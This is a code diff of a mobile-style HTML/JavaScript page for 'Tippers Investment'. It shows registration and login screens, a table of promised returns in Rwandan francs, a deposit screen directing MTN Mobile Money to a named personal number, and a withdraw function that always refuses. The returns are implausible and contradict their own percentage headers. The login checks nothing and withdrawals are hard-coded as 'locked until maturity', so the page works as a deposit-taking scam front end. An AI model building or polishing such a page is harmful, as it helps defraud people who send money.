@@ -35,7 +35,7 @@ overflow-y:auto;
 }
 
 .title{color:#f59e0b;text-align:center;font-weight:bold;}
-.desc{text-align:center;margin-top:10px;color:#ccc}
+.desc{text-align:center;margin-top:10px;color:#cbd5e1}
 
 input,select{
 width:100%;
@@ -59,8 +59,6 @@ font-weight:bold;
 cursor:pointer;
 }
 
-.row{display:flex;gap:5px;}
-
 .nav{
 display:flex;
 justify-content:space-around;
@@ -69,7 +67,7 @@ padding:10px;
 }
 
 .nav div{text-align:center;cursor:pointer;}
-.nav i{display:block;font-size:20px;margin-bottom:3px;}
+.nav i{display:block;margin-bottom:3px;}
 
 #toast{
 position:fixed;
@@ -83,13 +81,11 @@ border-radius:8px;
 display:none;
 }
 
-/* TABLE SCROLL FIX */
+/* TABLE */
 .tableWrap{
-margin-top:15px;
-background:#0f172a;
-border-radius:12px;
 overflow-x:auto;
-white-space:nowrap;
+margin-top:10px;
+border-radius:10px;
 }
 
 table{
@@ -99,9 +95,9 @@ font-size:12px;
 }
 
 th,td{
+border:1px solid #1f2937;
 padding:8px;
 text-align:center;
-border:1px solid #1f2937;
 }
 
 th{
@@ -109,21 +105,12 @@ background:#111827;
 color:#f59e0b;
 }
 
-/* CARD */
 .card{
 background:#111;
 padding:15px;
 border-radius:12px;
 margin-top:10px;
 }
-
-.money{
-background:#111;
-padding:10px;
-border-radius:10px;
-text-align:center;
-}
-
 </style>
 </head>
 
@@ -135,7 +122,6 @@ text-align:center;
 <div class="nav" id="nav" style="display:none">
 <div onclick="home()"><i class="fa fa-home"></i>HOME</div>
 <div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
-<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
 <div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
 </div>
 </div>
@@ -144,18 +130,12 @@ text-align:center;
 
 <script>
 
-let users=[];
-let depositDone=false;
+let step=0;
 let amount=0;
-let selectedPeriod=0;
+let depositDone=false;
 
 const screen=document.getElementById("screen");
 const nav=document.getElementById("nav");
-
-/* FORMAT MONEY */
-function formatMoney(n){
-return Number(n).toLocaleString("en-US")+" RWF";
-}
 
 /* TOAST */
 function toast(m){
@@ -168,37 +148,21 @@ setTimeout(()=>t.style.display="none",2000);
 /* START */
 function start(){
 screen.innerHTML=`
-<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
-<p class="desc">Start smart investment journey</p>
+<h2 class="title">WELCOME TO TIPPERS INVESTMENT</h2>
+<p class="desc">Start your smart earning journey step by step</p>
 <button onclick="register()">START</button>
 `;
 }
 
-/* REGISTER simplified (unchanged core) */
+/* REGISTER */
 function register(){
 screen.innerHTML=`
 <h3 class="title">REGISTER</h3>
+<p class="desc">Fill all required fields correctly</p>
 
-<input id="f" placeholder="First name">
-<input id="l" placeholder="Last name">
-
-<select id="g">
-<option value="">Gender</option>
-<option>Male</option>
-<option>Female</option>
-</select>
-
-<div class="row">
-<select id="code">
-<option>+250</option>
-<option>+254</option>
-</select>
-<input id="phone" placeholder="Phone">
-</div>
-
+<input id="name" placeholder="Full name">
 <input id="email" placeholder="Email">
-<input id="pass" placeholder="6 digits password">
-<input id="cpass" placeholder="Confirm password">
+<input id="pass" placeholder="6 digit password">
 
 <button onclick="login()">REGISTER</button>
 `;
@@ -207,45 +171,47 @@ screen.innerHTML=`
 /* LOGIN */
 function login(){
 nav.style.display="flex";
-home();
+
+screen.innerHTML=`
+<h3 class="title">LOGIN</h3>
+<p class="desc">Enter credentials to continue</p>
+
+<input id="le" placeholder="Email">
+<input id="lp" placeholder="Password">
+
+<button onclick="showTable()">LOGIN</button>
+`;
 }
 
-/* HOME TABLE */
-function home(){
-screen.innerHTML=investmentTable();
-}
+/* TABLE (RESTORED FULL HEADER) */
+function showTable(){
 
-/* TABLE FIXED + SCROLL */
-function investmentTable(){
-return `
+screen.innerHTML=`
+<h3 class="title">TIPPERS INVESTMENT PLAN</h3>
+<p class="desc">Daily / Weekly / Monthly profit structure</p>
+
 <div class="tableWrap">
 <table>
 <tr>
 <th>AMOUNT</th>
-<th>2.2%</th>
-<th>WEEK</th>
-<th>MONTH</th>
-<th>45D</th>
-<th>3M</th>
-<th>4M</th>
+<th>DAILY 2.2%</th>
+<th>WEEKLY 3%</th>
+<th>MONTHLY 3.6%</th>
+<th>45 DAYS</th>
+<th>3 MONTHS</th>
+<th>4 MONTHS</th>
 </tr>
 
-<tr><td>${formatMoney(5000)}</td><td>${formatMoney(110)}</td><td>${formatMoney(1050)}</td><td>${formatMoney(5400)}</td><td>${formatMoney(9225)}</td><td>${formatMoney(22500)}</td><td>${formatMoney(42000)}</td></tr>
-
-<tr><td>${formatMoney(50000)}</td><td>${formatMoney(1100)}</td><td>${formatMoney(10500)}</td><td>${formatMoney(54000)}</td><td>${formatMoney(92250)}</td><td>${formatMoney(225000)}</td><td>${formatMoney(420000)}</td></tr>
-
-<tr><td>${formatMoney(100000)}</td><td>${formatMoney(2200)}</td><td>${formatMoney(21000)}</td><td>${formatMoney(108000)}</td><td>${formatMoney(184500)}</td><td>${formatMoney(450000)}</td><td>${formatMoney(840000)}</td></tr>
-
-<tr><td>${formatMoney(150000)}</td><td>${formatMoney(3300)}</td><td>${formatMoney(31500)}</td><td>${formatMoney(162000)}</td><td>${formatMoney(276750)}</td><td>${formatMoney(675000)}</td><td>${formatMoney(1260000)}</td></tr>
-
-<tr><td>${formatMoney(300000)}</td><td>${formatMoney(6600)}</td><td>${formatMoney(63000)}</td><td>${formatMoney(324000)}</td><td>${formatMoney(553500)}</td><td>${formatMoney(1350000)}</td><td>${formatMoney(2520000)}</td></tr>
-
-<tr><td>${formatMoney(500000)}</td><td>${formatMoney(11000)}</td><td>${formatMoney(105000)}</td><td>${formatMoney(540000)}</td><td>${formatMoney(922500)}</td><td>${formatMoney(2250000)}</td><td>${formatMoney(4200000)}</td></tr>
-
-<tr><td>${formatMoney(700000)}</td><td>${formatMoney(15400)}</td><td>${formatMoney(147000)}</td><td>${formatMoney(756000)}</td><td>${formatMoney(1291500)}</td><td>${formatMoney(3150000)}</td><td>${formatMoney(5880000)}</td></tr>
-
-<tr><td>${formatMoney(1000000)}</td><td>${formatMoney(22000)}</td><td>${formatMoney(210000)}</td><td>${formatMoney(1080000)}</td><td>${formatMoney(1845000)}</td><td>${formatMoney(4500000)}</td><td>${formatMoney(8400000)}</td></tr>
-
+<tr><td>5,000</td><td>110</td><td>1,050</td><td>5,400</td><td>9,225</td><td>22,500</td><td>42,000</td></tr>
+<tr><td>50,000</td><td>1,100</td><td>10,500</td><td>54,000</td><td>92,250</td><td>225,000</td><td>420,000</td></tr>
+<tr><td>100,000</td><td>2,200</td><td>21,000</td><td>108,000</td><td>184,500</td><td>450,000</td><td>840,000</td></tr>
+<tr><td>150,000</td><td>3,300</td><td>31,500</td><td>162,000</td><td>276,750</td><td>675,000</td><td>1,260,000</td></tr>
+<tr><td>300,000</td><td>6,600</td><td>63,000</td><td>324,000</td><td>553,500</td><td>1,350,000</td><td>2,520,000</td></tr>
+<tr><td>500,000</td><td>11,000</td><td>105,000</td><td>540,000</td><td>922,500</td><td>2,250,000</td><td>4,200,000</td></tr>
+<tr><td>700,000</td><td>15,400</td><td>147,000</td><td>756,000</td><td>1,291,500</td><td>3,150,000</td><td>5,880,000</td></tr>
+<tr><td>1,000,000</td><td>22,000</td><td>210,000</td><td>1,080,000</td><td>1,845,000</td><td>4,500,000</td><td>8,400,000</td></tr>
+<tr><td>1,300,000</td><td>28,600</td><td>273,000</td><td>1,404,000</td><td>2,398,500</td><td>5,850,000</td><td>10,920,000</td></tr>
+<tr><td>1,500,000</td><td>33,000</td><td>315,000</td><td>1,620,000</td><td>2,767,500</td><td>6,250,000</td><td>12,600,000</td></tr>
 </table>
 </div>
 
@@ -257,8 +223,9 @@ return `
 function deposit(){
 screen.innerHTML=`
 <h3 class="title">DEPOSIT</h3>
+<p class="desc">Add funds using MTN Mobile Money</p>
 
-<input id="amt" placeholder="Amount">
+<input id="amt" placeholder="Amount (RWF)">
 <input id="sender" placeholder="Sender name">
 
 <button onclick="payment()">CONTINUE</button>
@@ -268,7 +235,8 @@ screen.innerHTML=`
 /* PAYMENT */
 function payment(){
 screen.innerHTML=`
-<h3 class="title">PAYMENT INFO</h3>
+<h3 class="title">PAYMENT INFORMATION</h3>
+<p class="desc">Follow instructions carefully</p>
 
 <div class="card">
 0795410739<br><br>BARAKA BOLINGO
@@ -278,35 +246,36 @@ screen.innerHTML=`
 `;
 }
 
-/* WITHDRAW (FIXED PHONE INPUT) */
+/* WITHDRAW (FIXED) */
 function withdraw(){
 screen.innerHTML=`
 <h3 class="title">WITHDRAW</h3>
+<p class="desc">Enter MTN number and amount</p>
 
 <input id="wamt" placeholder="Amount">
-
-<input id="wphone" placeholder="MTN number (+250...)">
+<input id="wphone" placeholder="MTN number +250...">
 
 <button onclick="doWithdraw()">WITHDRAW</button>
 `;
 }
 
 function doWithdraw(){
-if(!wamt.value || !wphone.value){
+if(!wamt.value||!wphone.value){
 toast("Fill all fields ❌");return;
 }
 
 if(!wphone.value.startsWith("+250")){
-toast("Only MTN numbers allowed ❌");return;
+toast("Use MTN number only ❌");return;
 }
 
 if(parseInt(wamt.value)<7500){
 toast("INVALID INPUT ❌");return;
 }
 
-toast("Withdraw locked until maturity");
+toast("Withdraw locked until maturity ❌");
 }
 
+/* START */
 start();
 
 </script>
